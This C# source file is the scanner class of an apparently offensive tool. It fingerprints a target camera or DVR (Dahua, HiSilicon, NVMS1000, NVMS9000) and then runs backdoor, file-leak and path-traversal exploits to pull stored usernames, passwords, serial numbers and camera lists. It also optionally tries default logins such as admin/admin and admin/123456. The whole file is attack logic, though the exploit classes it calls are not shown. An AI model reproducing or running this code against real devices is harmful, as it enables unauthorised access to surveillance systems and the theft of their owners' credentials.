using System;
using System.Net;
using System.Threading;

using Kaye.Models;
using Kaye.Profiles;
using Kaye.BruteForce;

namespace Kaye.Exploits
{
    public class ExploitScanner
    {
        IPEndPoint Target;

        public delegate void ModelFoundEventDelegate(Model Model);
        public delegate void ExploitFoundEventDelegate(Exploit Exploit);
        public delegate void CredentialsFoundEventDelegate(String Username, String Password);

        public event ModelFoundEventDelegate OnModelFound;
        public event ExploitFoundEventDelegate OnExploitFound;
        public event CredentialsFoundEventDelegate OnCredentialsFound;

        public ExploitType[] Exploits = new ExploitType[0];
        public Profile[] Profiles = new Profile[0];
        public String SerialNum, Info;
        public String[] CameraList;

        public ExploitScanner(IPEndPoint Target)
        {
            this.Target = Target;
        }

        private void AddExploit(ExploitType Type)
        {
            Array.Resize(ref Exploits, Exploits.Length + 1);
            Exploits[Exploits.Length - 1] = Type;
        }

        private void AddProfile(Profile Profile)
        {
            Array.Resize(ref Profiles, Profiles.Length + 1);
            Profiles[Profiles.Length - 1] = Profile;
        }

        public Boolean IsExploitPresent(ExploitType Type)
        {
            for (Int32 i = 0; i < Exploits.Length; i++)
                if (Exploits[i] == Type) return true;
            return false;
        }

        public void Scan(Boolean TryCredentials)
        {
            ModelScanner Scanner = new ModelScanner();
            Model MScan = Scanner.Scan(Target);
            OnModelFound(MScan);

            LoginMaker Login = new LoginMaker(Target, MScan);

            if (MScan == Model.Dahua)
            {
                DahuaBackdoor Backdoor;
                DahuaCapFile CapFile;
                Boolean BackdoorResult = DahuaBackdoor.TryPerform(Target, out Backdoor);
                if (BackdoorResult)
                {
                    AddExploit(ExploitType.DahuaBackdoor);
                    OnExploitFound(Backdoor);
                    Profiles = Backdoor.Profiles;
                    SerialNum = Backdoor.SerialNum;
                }
                Boolean CapFileResult = DahuaCapFile.TryPerform(Target, out CapFile);
                if (CapFileResult)
                {
                    AddExploit(ExploitType.DahuaCapFile);
                    OnExploitFound(CapFile);
                    Info = CapFile.Info;
                    CameraList = CapFile.CameraList;
                }
                if (TryCredentials && Login.TryLogin("admin", "admin"))
                {
                    AddProfile(new Profile("admin", "admin"));
                    OnCredentialsFound("admin", "admin");
                }
            }

            if (MScan == Model.HiSilicon)
            {
                HiSiliconPathTraversal PathTraversal;
                Boolean TraversalResult = HiSiliconPathTraversal.TryPerform(Target, out PathTraversal);
                if (TraversalResult)
                {
                    AddExploit(ExploitType.HiSiliconPathTraversal);
                    OnExploitFound(PathTraversal);
                    Profiles = PathTraversal.Profiles;
                }
            }

            if (MScan == Model.NVMS1000)
            {
                NVMS1000PathTraversal PathTraversal;
                Boolean TraversalResult = NVMS1000PathTraversal.TryPerform(Target, out PathTraversal);
                if (TraversalResult)
                {
                    AddExploit(ExploitType.NVMS1000PathTraversal);
                    OnExploitFound(PathTraversal);
                    Profiles = PathTraversal.Profiles;
                    if (PathTraversal.Profiles.Length == 1) OnCredentialsFound(Profiles[0].Username, Profiles[0].Password);
                }
                if (!TraversalResult && TryCredentials && Login.TryLogin("admin", "123456"))
                {
                    AddProfile(new Profile("admin", "123456"));
                    OnCredentialsFound("admin", "123456");
                }
            }

            if (MScan == Model.NVMS9000)
            {
                NVMS9000Backdoor Backdoor;
                NVMS9000PathTraversal PathTraversal;
                Boolean TraversalResult = NVMS9000PathTraversal.TryPerform(Target, out PathTraversal);
                if (TraversalResult)
                {
                    AddExploit(ExploitType.NVMS9000PathTraversal);
                    OnExploitFound(PathTraversal);
                    Profiles = PathTraversal.Profiles;
                    if (PathTraversal.Profiles.Length == 1) OnCredentialsFound(Profiles[0].Username, Profiles[0].Password);
                }
                Boolean BackdoorResult = NVMS9000Backdoor.TryPerform(Target, out Backdoor);
                if (BackdoorResult)
                {
                    AddExploit(ExploitType.NVMS9000Backdoor);
                    OnExploitFound(Backdoor);
                }
                if (!TraversalResult && TryCredentials && Login.TryLogin("admin", "123456"))
                {
                    AddProfile(new Profile("admin", "123456"));
                    OnCredentialsFound("admin", "123456");
                }
            }
        }
    }
}